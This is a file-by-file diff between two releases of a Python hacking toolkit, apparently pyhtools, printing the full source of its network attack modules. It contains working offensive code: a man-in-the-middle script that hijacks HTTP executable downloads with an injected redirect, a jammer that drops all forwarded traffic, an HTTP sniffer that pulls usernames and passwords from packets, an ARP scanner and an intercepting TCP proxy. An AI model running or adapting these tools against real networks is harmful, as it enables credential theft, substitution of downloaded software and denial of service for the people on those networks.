+
+
+############################### Main ############################### 
+
+print('[*] configuring packet receiver...')
+
+forward_packets()
+print('[*] packet receiver configured successfully.\n')
+
+print('[*] Creating Queue to start receiving packets.')
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    # Bind queue with queue-number 0
+    queue.bind(0, process_packet)
+    queue.run()
+
+except OSError as e:
+    print('[-] Run script with root priviliges.')
+    print(e)
+
+except KeyboardInterrupt:
+    print('\r[-] Keyboard Interrupt detected!')
+
+except Exception:
+    print('[-] An Exception occurred while creating queue.\n', Exception)
+
+finally:
+    print('[*] Restoring previous configurations.. please be patient...')
+    reset_config()
+
+    print('[-] Program stopped.')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/downloads_replacer.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/downloads_replacer.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,146 +1,146 @@
-#!usr/bin/env python
-
-#########################################################################
-# Author : Dhrumil Mistry
-#########################################################################
-
-
-#########################################################################
-# If you encounter Import error after installing netfilter use command 
-# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
-
-# OR use below commands
-
-# sudo apt install libnfnetlink-dev libnetfilter-queue-dev
-# pip3 install nfqp3
-
-#########################################################################
-
-
-# Steps to test this tool
-# 1. cd /var/www/html
-# 2. sudo touch testfile.exe
-# 3. sudo python3 -m http.server 80
-# 4. run this script with superuser priviliges.
-# 5. open any browser
-# 6. visit localhost or your host ip to check whether site is up.
-# 7. request localhost/testfile.exe
-# 8. now you should get prompt to download brave browser instead of testfile.exe
-
-
-from os import remove
-from subprocess import call
-import netfilterqueue
-import scapy.all as scapy
-
-
-# REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
-# REDIRECT = b'10.0.2.15/redirect.exe'
-
-
-############################### Functions ############################### 
-def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
-    '''
-
-    # executing the following command
-    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
-    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
-    # -I -> insert (packet into a chain specified by the user)
-    # -j -> jump if the packet matches the target.
-    # --queue-num -> jump to specfic queue number
-    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
-
-    # for local host
-    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
-    
-
-
-def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
-    '''
-    call('sudo iptables --flush', shell=True)
-
-
-ack_list = []
-
-def set_load(packet, load):
-    packet[scapy.Raw].load = load
-
-    # since now the packet has been tampered, the new 
-    # packet will have differet length and checksums
-    # so we'll delete these fields and scapy will 
-    # automatically calulate these for us.
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-
-    return packet
-
-def process_packet(packet):
-    '''
-    process received packet, everytime a packet is received.
-    prints the packet received in the queue and it changes 
-    the DNS response dest ip with your desired ip.
-    '''
-    scapy_pkt = scapy.IP(packet.get_payload())
-
-    # HTTP layer is in the Raw layer.
-    # if dport (destination port) = http (i.e. port 80) in TCP and raw layer 
-    # consists of get method then, packet consists a HTTP request.
-    # 
-    # if sport (source port) = http (80) in TCP then the packet consists 
-    # a HTTP response.
-    #  
-    if scapy_pkt.haslayer(scapy.Raw):
-        if scapy_pkt[scapy.TCP].dport == 80:
-            if b".exe" in scapy_pkt[scapy.Raw].load:
-                print('[*] EXE Request Detected!')
-                ack_list.append(scapy_pkt[scapy.TCP].ack)
-
-
-        elif scapy_pkt[scapy.TCP].sport == 80:
-            if scapy_pkt[scapy.TCP].seq in ack_list:
-                print('[*] Replacing File!\n')
-                ack_list.remove(scapy_pkt[scapy.TCP].seq)
-                
-                modified_pkt = set_load(scapy_pkt, "HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n")
-                packet.set_payload(bytes(modified_pkt))
-        
-    packet.accept()
-    
-
-############################### Main ############################### 
-
-print('[*] configuring packet receiver...')
-
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
-
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
-
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
-
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
-
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
-
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
-
-    print('[-] Program stopped.')
+#!usr/bin/env python
+
+#########################################################################
+# Author : Dhrumil Mistry
+#########################################################################
+
+
+#########################################################################
+# If you encounter Import error after installing netfilter use command 
+# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
+
+# OR use below commands
+
+# sudo apt install libnfnetlink-dev libnetfilter-queue-dev
+# pip3 install nfqp3
+
+#########################################################################
+
+
+# Steps to test this tool
+# 1. cd /var/www/html
+# 2. sudo touch testfile.exe
+# 3. sudo python3 -m http.server 80
+# 4. run this script with superuser priviliges.
+# 5. open any browser
+# 6. visit localhost or your host ip to check whether site is up.
+# 7. request localhost/testfile.exe
+# 8. now you should get prompt to download brave browser instead of testfile.exe
+
+
+from os import remove
+from subprocess import call
+import netfilterqueue
+import scapy.all as scapy
+
+
+# REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
+# REDIRECT = b'10.0.2.15/redirect.exe'
+
+
+############################### Functions ############################### 
+def forward_packets():
+    '''
+    configures the mitm for incoming request packets
+    into a queue.
+    '''
+
+    # executing the following command
+    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
+    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
+    # -I -> insert (packet into a chain specified by the user)
+    # -j -> jump if the packet matches the target.
+    # --queue-num -> jump to specfic queue number
+    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+
+    # for local host
+    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    
+
+
+def reset_config():
+    '''
+    resets the configurations changed while exectution of the program to 
+    its original configuration.
+    '''
+    call('sudo iptables --flush', shell=True)
+
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+
+    # since now the packet has been tampered, the new 
+    # packet will have differet length and checksums
+    # so we'll delete these fields and scapy will 
+    # automatically calulate these for us.
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+
+    return packet
+
+def process_packet(packet):
+    '''
+    process received packet, everytime a packet is received.
+    prints the packet received in the queue and it changes 
+    the DNS response dest ip with your desired ip.
+    '''
+    scapy_pkt = scapy.IP(packet.get_payload())
+
+    # HTTP layer is in the Raw layer.
+    # if dport (destination port) = http (i.e. port 80) in TCP and raw layer 
+    # consists of get method then, packet consists a HTTP request.
+    # 
+    # if sport (source port) = http (80) in TCP then the packet consists 
+    # a HTTP response.
+    #  
+    if scapy_pkt.haslayer(scapy.Raw):
+        if scapy_pkt[scapy.TCP].dport == 80:
+            if b".exe" in scapy_pkt[scapy.Raw].load:
+                print('[*] EXE Request Detected!')
+                ack_list.append(scapy_pkt[scapy.TCP].ack)
+
+
+        elif scapy_pkt[scapy.TCP].sport == 80:
+            if scapy_pkt[scapy.TCP].seq in ack_list:
+                print('[*] Replacing File!\n')
+                ack_list.remove(scapy_pkt[scapy.TCP].seq)
+                
+                modified_pkt = set_load(scapy_pkt, "HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n")
+                packet.set_payload(bytes(modified_pkt))
+        
+    packet.accept()
+    
+
+############################### Main ############################### 
+
+print('[*] configuring packet receiver...')
+
+forward_packets()
+print('[*] packet receiver configured successfully.\n')
+
+print('[*] Creating Queue to start receiving packets.')
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    # Bind queue with queue-number 0
+    queue.bind(0, process_packet)
+    queue.run()
+
+except OSError as e:
+    print('[-] Run script with root priviliges.')
+    print(e)
+
+except KeyboardInterrupt:
+    print('\r[-] Keyboard Interrupt detected!')
+
+except Exception:
+    print('[-] An Exception occurred while creating queue.\n', Exception)
+
+finally:
+    print('[*] Restoring previous configurations.. please be patient...')
+    reset_config()
+
+    print('[-] Program stopped.')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/network_jammer.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/network_jammer.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,75 +1,75 @@
-#!usr/bin/env python
-
-#########################################################################
-# Author : Dhrumil Mistry
-#########################################################################
-
-
-#########################################################################
-# If you encounter Import error after installing netfilter use command 
-# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
-#########################################################################
-
-
-from subprocess import call
-import netfilterqueue
-
-############################### Functions ############################### 
-def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
-    '''
-
-    # executing the following command
-    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
-    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
-    # -I -> insert (packet into a chain specified by the user)
-    # -j -> jump if the packet matches the target.
-    # --queue-num -> jump to specfic queue number
-    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
-
-
-def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
-    '''
-    call('sudo iptables --flush', shell=True)
-
-
-def process_packet(packet):
-    '''
-    process received packet, everytime a packet is received.
-    prints the packet received in the queue.
-    '''
-    print(packet)
-    packet.drop()
-    
-
-############################### Main ############################### 
-
-print('[*] configuring packet receiver...')
-
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
-
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-   # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
-
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
-
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
-
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
-
-    print('[-] Program stopped.')
+#!usr/bin/env python
+
+#########################################################################
+# Author : Dhrumil Mistry
+#########################################################################
+
+
+#########################################################################
+# If you encounter Import error after installing netfilter use command 
+# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
+#########################################################################
+
+
+from subprocess import call
+import netfilterqueue
+
+############################### Functions ############################### 
+def forward_packets():
+    '''
+    configures the mitm for incoming request packets
+    into a queue.
+    '''
+
+    # executing the following command
+    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
+    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
+    # -I -> insert (packet into a chain specified by the user)
+    # -j -> jump if the packet matches the target.
+    # --queue-num -> jump to specfic queue number
+    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+
+
+def reset_config():
+    '''
+    resets the configurations changed while exectution of the program to 
+    its original configuration.
+    '''
+    call('sudo iptables --flush', shell=True)
+
+
+def process_packet(packet):
+    '''
+    process received packet, everytime a packet is received.
+    prints the packet received in the queue.
+    '''
+    print(packet)
+    packet.drop()
+    
+
+############################### Main ############################### 
+
+print('[*] configuring packet receiver...')
+
+forward_packets()
+print('[*] packet receiver configured successfully.\n')
+
+print('[*] Creating Queue to start receiving packets.')
+try:
+    queue = netfilterqueue.NetfilterQueue()
+   # Bind queue with queue-number 0
+    queue.bind(0, process_packet)
+    queue.run()
+
+except OSError as e:
+    print('[-] Run script with root priviliges.')
+    print(e)
+
+except Exception:
+    print('[-] An Exception occurred while creating queue.\n', Exception)
+
+finally:
+    print('[*] Restoring previous configurations.. please be patient...')
+    reset_config()
+
+    print('[-] Program stopped.')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/nwscan.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/nwscan.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,72 +1,72 @@
-from pyhtools.UI.colors import BRIGHT_WHITE, BRIGHT_YELLOW, BRIGHT_RED
-
-
-import scapy.all as sp
-import argparse
-
-
-def get_args():
-    '''
-    description: get arguments from the command line.
-    params: None
-    returns: str
-    '''
-    parser = argparse.ArgumentParser(description='search for other devices on the network')
-    parser.add_argument('-ip', help='ip or ip range of the target device')
-    args = parser.parse_args()
-
-    return args.ip
-
-
-def scan(ip):
-    '''
-    description: scans ip range for clients and returns discovered clients list.
-    params: ip (str)
-    returns: clients (list)
-    '''
-    print(BRIGHT_WHITE + f'[*] Discovering Clients {ip}')
-    arp_req = sp.ARP(pdst=ip)
-    brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
-    packet = brdcst / arp_req
-    responded_list = sp.srp(packet, timeout=2, retry=3,verbose=False)[0]
-
-    clients = []
-    for ele in responded_list:
-        clients.append({"ip": ele[1].psrc, 'mac': ele[1].hwsrc})
-
-    return clients
-
-
-def print_clients(clients):
-    '''
-    description: prints discovered clients on the network ip range.
-    params: clients(list)
-    returns: None
-    '''
-    print(BRIGHT_YELLOW + '________________________________________________________')
-    print(BRIGHT_YELLOW + 'IP\t\t\tMAC Address')
-    print(BRIGHT_YELLOW + '--------------------------------------------------------')
-
-    for client in clients:
-        print( BRIGHT_WHITE + client.get('ip') + '\t\t' + client.get('mac'))
-    
-    print(BRIGHT_YELLOW + '________________________________________________________\n')
-    
-
-def run_nwscan(ip:str):
-    '''
-    description: starts network scanner for specified ip range or ip.
-    params: IP (str)
-    returns: None
-    '''
-    try:
-        print(BRIGHT_YELLOW + '[*] Starting Network Scanner....')
-        clients = scan(ip)
-        print_clients(clients)
-    except Exception as e:
-        print(BRIGHT_RED + '[-] Exception : ', e)
-
-
-if __name__ == "__main__":
-    IP = get_args()
-    run_nwscan(IP)
+from pyhtools.UI.colors import BRIGHT_WHITE, BRIGHT_YELLOW, BRIGHT_RED
+
+
+import scapy.all as sp
+import argparse
+
+
+def get_args():
+    '''
+    description: get arguments from the command line.
+    params: None
+    returns: str
+    '''
+    parser = argparse.ArgumentParser(description='search for other devices on the network')
+    parser.add_argument('-ip', help='ip or ip range of the target device')
+    args = parser.parse_args()
+
+    return args.ip
+
+
+def scan(ip):
+    '''
+    description: scans ip range for clients and returns discovered clients list.
+    params: ip (str)
+    returns: clients (list)
+    '''
+    print(BRIGHT_WHITE + f'[*] Discovering Clients {ip}')
+    arp_req = sp.ARP(pdst=ip)
+    brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
+    packet = brdcst / arp_req
+    responded_list = sp.srp(packet, timeout=2, retry=3,verbose=False)[0]
+
+    clients = []
+    for ele in responded_list:
+        clients.append({"ip": ele[1].psrc, 'mac': ele[1].hwsrc})
+
+    return clients
+
+
+def print_clients(clients):
+    '''
+    description: prints discovered clients on the network ip range.
+    params: clients(list)
+    returns: None
+    '''
+    print(BRIGHT_YELLOW + '________________________________________________________')
+    print(BRIGHT_YELLOW + 'IP\t\t\tMAC Address')
+    print(BRIGHT_YELLOW + '--------------------------------------------------------')
+
+    for client in clients:
+        print( BRIGHT_WHITE + client.get('ip') + '\t\t' + client.get('mac'))
+    
+    print(BRIGHT_YELLOW + '________________________________________________________\n')
+    
+
+def run_nwscan(ip:str):
+    '''
+    description: starts network scanner for specified ip range or ip.
+    params: IP (str)
+    returns: None
+    '''
+    try:
+        print(BRIGHT_YELLOW + '[*] Starting Network Scanner....')
+        clients = scan(ip)
+        print_clients(clients)
+    except Exception as e:
+        print(BRIGHT_RED + '[-] Exception : ', e)
+
+
+if __name__ == "__main__":
+    IP = get_args()
+    run_nwscan(IP)
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/pkt_sniffer.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/pkt_sniffer.py`

 * *Ordering differences only*

 * *Files 22% similar despite different names*

```diff
@@ -1,101 +1,101 @@
-import scapy.all as sp # sudo pip install scapy_http (python2)
-from scapy.layers import http
-import argparse
-from sys import exit
-from pyhtools.UI.colors import *
-
-
-def get_args():
-	'''
-	description: get arguments from the command line.
-	params: None
-	returns: interface(str) 
-	'''
-	parser = argparse.ArgumentParser(description='Packet Sniffer')
-	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
-	args = parser.parse_args()
-
-	interface = args.interface
-	
-	del parser
-	return interface
-
-
-def check_args(intrfce):
-	'''
-	description: checks if the passed arguments are valid. if valid returns True.
-	params: intrfce(str)
-	returns: bool
-	'''
-	if not intrfce:
-		exit(BRIGHT_RED + "[-] Please enter interface argument, use -h or --help for more info")
-	return True
-
-
-def get_url(packet):
-	'''
-	description: extract url from the packet.
-	params: packet
-	returns: url(str)
-	'''
-	print('IN GET URL')
-	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')
-
-
-def get_login_info(packet):
-	'''
-	description: extract login information from the sniffed packet.
-	params: packet
-	returns: url with login information
-	'''
-	if packet.haslayer(sp.Raw):
-			load = str(packet[sp.Raw].load,encoding='utf-8')
-			keywords = ["username", "user", "password", "pass", "login"]
-			for keyword in keywords:
-				if keyword in load:
-					return load
-
-
-def sniffer(intrfce, args_status):
-	'''
-	description: sniffs packets over the network.
-	params: intrfce, args_status
-	returns: None
-	'''
-	try:
-		if args_status:
-			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
-	except Exception as e:
-		print(BRIGHT_RED + '[-] An error occured while sniffing...')
-		print(e)
-
-
-def process_sniffed_pkt(packet):
-	'''
-	description: analyzes the captured packet for login information.
-	params: packet
-	returns: None
-	'''
-	if packet.haslayer(http.HTTPRequest):
-		
-		url = get_url(packet)
-		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')
-
-		login_info = get_login_info(packet)
-		if login_info:
-			print(BRIGHT_YELLOW + '\n\n[+] Contains possible Login information :\n' + login_info + '\n\n')
-
-
-if __name__ == '__main__':
-	try:
-		INTERFACE = get_args()
-		ARGS_STATUS = check_args(INTERFACE)
-		print(BRIGHT_YELLOW + f'[*] Sniffing Packets over interface {INTERFACE}')
-		sniffer(INTERFACE, ARGS_STATUS)
-	except KeyboardInterrupt:
-		print(BRIGHT_YELLOW + '\r[-] ctrl+c detected...')
-	except Exception as e:
-		print(BRIGHT_RED + '[-] Closing Program due to Error...')
-		print(e)
-	finally:
-		print(BRIGHT_RED + '\r[-] Exiting Sniffer..')
+import scapy.all as sp # sudo pip install scapy_http (python2)
+from scapy.layers import http
+import argparse
+from sys import exit
+from pyhtools.UI.colors import *
+
+
+def get_args():
+	'''
+	description: get arguments from the command line.
+	params: None
+	returns: interface(str) 
+	'''
+	parser = argparse.ArgumentParser(description='Packet Sniffer')
+	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
+	args = parser.parse_args()
+
+	interface = args.interface
+	
+	del parser
+	return interface
+
+
+def check_args(intrfce):
+	'''
+	description: checks if the passed arguments are valid. if valid returns True.
+	params: intrfce(str)
+	returns: bool
+	'''
+	if not intrfce:
+		exit(BRIGHT_RED + "[-] Please enter interface argument, use -h or --help for more info")
+	return True
+
+
+def get_url(packet):
+	'''
+	description: extract url from the packet.
+	params: packet
+	returns: url(str)
+	'''
+	print('IN GET URL')
+	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')
+
+
+def get_login_info(packet):
+	'''
+	description: extract login information from the sniffed packet.
+	params: packet
+	returns: url with login information
+	'''
+	if packet.haslayer(sp.Raw):
+			load = str(packet[sp.Raw].load,encoding='utf-8')
+			keywords = ["username", "user", "password", "pass", "login"]
+			for keyword in keywords:
+				if keyword in load:
+					return load
+
+
+def sniffer(intrfce, args_status):
+	'''
+	description: sniffs packets over the network.
+	params: intrfce, args_status
+	returns: None
+	'''
+	try:
+		if args_status:
+			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
+	except Exception as e:
+		print(BRIGHT_RED + '[-] An error occured while sniffing...')
+		print(e)
+
+
+def process_sniffed_pkt(packet):
+	'''
+	description: analyzes the captured packet for login information.
+	params: packet
+	returns: None
+	'''
+	if packet.haslayer(http.HTTPRequest):
+		
+		url = get_url(packet)
+		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')
+
+		login_info = get_login_info(packet)
+		if login_info:
+			print(BRIGHT_YELLOW + '\n\n[+] Contains possible Login information :\n' + login_info + '\n\n')
+
+
+if __name__ == '__main__':
+	try:
+		INTERFACE = get_args()
+		ARGS_STATUS = check_args(INTERFACE)
+		print(BRIGHT_YELLOW + f'[*] Sniffing Packets over interface {INTERFACE}')
+		sniffer(INTERFACE, ARGS_STATUS)
+	except KeyboardInterrupt:
+		print(BRIGHT_YELLOW + '\r[-] ctrl+c detected...')
+	except Exception as e:
+		print(BRIGHT_RED + '[-] Closing Program due to Error...')
+		print(e)
+	finally:
+		print(BRIGHT_RED + '\r[-] Exiting Sniffer..')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/tcp_proxy.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/tcp_proxy.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,153 +1,153 @@
-from functools import wraps
-from threading import Thread
-
-import os
-import socket
-import logging
-
-logging.basicConfig(level=logging.DEBUG,
-                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
-
-
-class TCProxy:
-    def __init__(self, filepath: str = None) -> None:
-        self.__file_name = filepath
-
-        if self.__file_name and os.path.isfile(self.__file_name):
-            logging.warning(
-                f'{self.__file_name} file data will be overwritten!')
-            with open(self.__file_name, 'wb') as f:
-                f.write(b'')
-
-        elif self.__file_name:
-            logging.info(
-                f'Captured data will be saved in file {self.__file_name}')
-
-    def receive_from(self, conn: socket.socket):
-        '''Accepts socket data and returns data from the buffer'''
-        conn.settimeout(5)
-        try:
-            buff = b''
-            while True:
-                data = conn.recv(4096)
-                if not data:
-                    break
-                buff += data
-        except Exception:
-            pass
-        return buff
-
-    @staticmethod
-    def handler(func):
-        '''Use for packet modification'''
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            res = None
-            try:
-                res = func(**args, **kwargs)
-                return res
-            except Exception as e:
-                logging.error(e)
-
-        return wrapper
-
-    @handler
-    def request_handler(self, buff: bytes):
-        '''manipulate buffer data before sending request to remote host'''
-        return buff
-
-    @handler
-    def response_handler(self, buff: bytes):
-        '''manipulate buffer data after receiving from remote host'''
-        return buff
-
-    def __write_data(self, data):
-        if not isinstance(data, bytes):
-            data = bytes(data, encoding='utf-8')
-
-        if self.__file_name:
-            with open(self.__file_name, 'ab') as f:
-                f.write(data)
-
-    def proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True):
-        address_family = socket.AF_INET if v4 else socket.AF_INET6
-        remote_sock = socket.socket(address_family, socket.SOCK_STREAM)
-        remote_sock.connect((remote_host, remote_port))
-        remote_buff = b''
-
-        if receive_first:
-            remote_buff = self.receive_from(client_sock)
-            self.__write_data(remote_buff)
-
-        remote_buff = self.response_handler(remote_buff)
-        if len(remote_buff):
-            logging.info(f'[<--] Send {len(remote_buff)} bytes to localhost')
-            client_sock.send(remote_buff)
-
-        while True:
-            # data from localhost to remote
-            local_buff = self.receive_from(client_sock)
-            if len(local_buff):
-                logging.info(
-                    f'[-->] Received {len(local_buff)} bytes from localhost')
-                local_buff = self.request_handler(local_buff)
-                remote_sock.send(local_buff)
-                logging.info(f'[-->] Sent to remote host')
-
-            # data from remote to localhost
-            remote_buff = self.response_handler(remote_buff)
-            if len(remote_buff):
-                logging.info(
-                    f'[<--] Received {len(remote_buff)} bytes from remote host')
-                client_sock.send(remote_buff)
-
-                remote_buff = self.response_handler(remote_buff)
-                client_sock.send(remote_buff)
-                logging.info(f'[<--] Sent to localhost')
-
-            # if no data is received close sockets
-            if not len(local_buff) or not len(remote_buff):
-                remote_sock.close()
-                client_sock.close()
-                logging.info('Closing connections due to no incoming data')
-                break
-
-    def serve_proxy(self,  remote_host: str, remote_port: int, host: str = '0.0.0.0', port: int = 8080, max_conns: int = 5, receive_first: bool = False, v4: bool = True):
-        address_family = socket.AF_INET if v4 else socket.AF_INET6
-        server = socket.socket(address_family, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        try:
-            server.bind((host, port))
-        except Exception as e:
-            logging.error(f'Cannot bind: {e}')
-
-        logging.info(
-            f'Listening on {host}:{port} with maximum {max_conns} connections')
-        server.listen(max_conns)
-
-        while True:
-            # accept client connection request
-            client_sock, addr = server.accept()
-            logging.info(f'Incoming from {addr[0]}:{addr[1]}')
-
-            # start proxy thread
-            # proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True)
-            thread = Thread(target=self.proxy_handler, args=(
-                client_sock, remote_host, remote_port, receive_first, v4))
-            try:
-                thread.start()
-            except Exception as e:
-                logging.error(f'Error in Thread: {e}')
-
-
-if __name__ == '__main__':
-    proxy = TCProxy()
-    proxy.serve_proxy(
-        remote_host='github.com',
-        remote_port=443,
-        host='0.0.0.0',
-        port=8080,
-        max_conns=5,
-        receive_first=True,
-        v4=True,
-    )
+from functools import wraps
+from threading import Thread
+
+import os
+import socket
+import logging
+
+logging.basicConfig(level=logging.DEBUG,
+                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
+
+
+class TCProxy:
+    def __init__(self, filepath: str = None) -> None:
+        self.__file_name = filepath
+
+        if self.__file_name and os.path.isfile(self.__file_name):
+            logging.warning(
+                f'{self.__file_name} file data will be overwritten!')
+            with open(self.__file_name, 'wb') as f:
+                f.write(b'')
+
+        elif self.__file_name:
+            logging.info(
+                f'Captured data will be saved in file {self.__file_name}')
+
+    def receive_from(self, conn: socket.socket):
+        '''Accepts socket data and returns data from the buffer'''
+        conn.settimeout(5)
+        try:
+            buff = b''
+            while True:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                buff += data
+        except Exception:
+            pass
+        return buff
+
+    @staticmethod
+    def handler(func):
+        '''Use for packet modification'''
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            res = None
+            try:
+                res = func(**args, **kwargs)
+                return res
+            except Exception as e:
+                logging.error(e)
+
+        return wrapper
+
+    @handler
+    def request_handler(self, buff: bytes):
+        '''manipulate buffer data before sending request to remote host'''
+        return buff
+
+    @handler
+    def response_handler(self, buff: bytes):
+        '''manipulate buffer data after receiving from remote host'''
+        return buff
+
+    def __write_data(self, data):
+        if not isinstance(data, bytes):
+            data = bytes(data, encoding='utf-8')
+
+        if self.__file_name:
+            with open(self.__file_name, 'ab') as f:
+                f.write(data)
+
+    def proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True):
+        address_family = socket.AF_INET if v4 else socket.AF_INET6
+        remote_sock = socket.socket(address_family, socket.SOCK_STREAM)
+        remote_sock.connect((remote_host, remote_port))
+        remote_buff = b''
+
+        if receive_first:
+            remote_buff = self.receive_from(client_sock)
+            self.__write_data(remote_buff)
+
+        remote_buff = self.response_handler(remote_buff)
+        if len(remote_buff):
+            logging.info(f'[<--] Send {len(remote_buff)} bytes to localhost')
+            client_sock.send(remote_buff)
+
+        while True:
+            # data from localhost to remote
+            local_buff = self.receive_from(client_sock)
+            if len(local_buff):
+                logging.info(
+                    f'[-->] Received {len(local_buff)} bytes from localhost')
+                local_buff = self.request_handler(local_buff)
+                remote_sock.send(local_buff)
+                logging.info(f'[-->] Sent to remote host')
+
+            # data from remote to localhost
+            remote_buff = self.response_handler(remote_buff)
+            if len(remote_buff):
+                logging.info(
+                    f'[<--] Received {len(remote_buff)} bytes from remote host')
+                client_sock.send(remote_buff)
+
+                remote_buff = self.response_handler(remote_buff)
+                client_sock.send(remote_buff)
+                logging.info(f'[<--] Sent to localhost')
+
+            # if no data is received close sockets
+            if not len(local_buff) or not len(remote_buff):
+                remote_sock.close()
+                client_sock.close()
+                logging.info('Closing connections due to no incoming data')
+                break
+
+    def serve_proxy(self,  remote_host: str, remote_port: int, host: str = '0.0.0.0', port: int = 8080, max_conns: int = 5, receive_first: bool = False, v4: bool = True):
+        address_family = socket.AF_INET if v4 else socket.AF_INET6
+        server = socket.socket(address_family, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            server.bind((host, port))
+        except Exception as e:
+            logging.error(f'Cannot bind: {e}')
+
+        logging.info(
+            f'Listening on {host}:{port} with maximum {max_conns} connections')
+        server.listen(max_conns)
+
+        while True:
+            # accept client connection request
+            client_sock, addr = server.accept()
+            logging.info(f'Incoming from {addr[0]}:{addr[1]}')
+
+            # start proxy thread
+            # proxy_handler(self, client_sock: socket.socket, remote_host: str, remote_port: int, receive_first: bool, v4: bool = True)
+            thread = Thread(target=self.proxy_handler, args=(
+                client_sock, remote_host, remote_port, receive_first, v4))
+            try:
+                thread.start()
+            except Exception as e:
+                logging.error(f'Error in Thread: {e}')
+
+
+if __name__ == '__main__':
+    proxy = TCProxy()
+    proxy.serve_proxy(
+        remote_host='github.com',
+        remote_port=443,
+        host='0.0.0.0',
+        port=8080,
+        max_conns=5,
+        receive_first=True,
+        v4=True,
+    )
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/enumerate.py` & `pyhtools-2.2.2/pyhtools/attackers/web/enumerate.py`

 * *Ordering differences only*

 * *Files 27% similar despite different names*

```diff
@@ -1,68 +1,68 @@
